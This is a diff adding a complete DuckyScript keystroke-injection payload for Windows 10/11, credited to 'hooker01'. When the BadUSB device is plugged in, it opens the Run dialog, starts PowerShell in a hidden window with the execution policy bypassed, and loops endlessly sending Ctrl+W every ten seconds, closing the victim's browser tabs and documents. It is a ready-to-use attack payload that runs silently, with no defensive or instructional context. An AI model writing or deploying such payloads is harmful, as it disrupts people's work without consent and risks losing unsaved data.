@@ -1,0 +1,14 @@
+REM ┌──────────────────────────────────────────────────────────────┐
+REM │ hooker01 | github.com/hooker01                               │
+REM │ Description: This script silently launches a loop that       │
+REM │              simulates pressing Ctrl+W every 10 seconds,     │
+REM │              which can close browser tabs or documents.      │
+REM │ Target: Windows 10/11                                        │
+REM └──────────────────────────────────────────────────────────────┘
+
+
+DELAY 400
+GUI r
+DELAY 500
+STRING powershell -W H -Ep Bypass -C "while ($true) {Start-Sleep -Seconds 10; Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('^w')}"
+ENTER
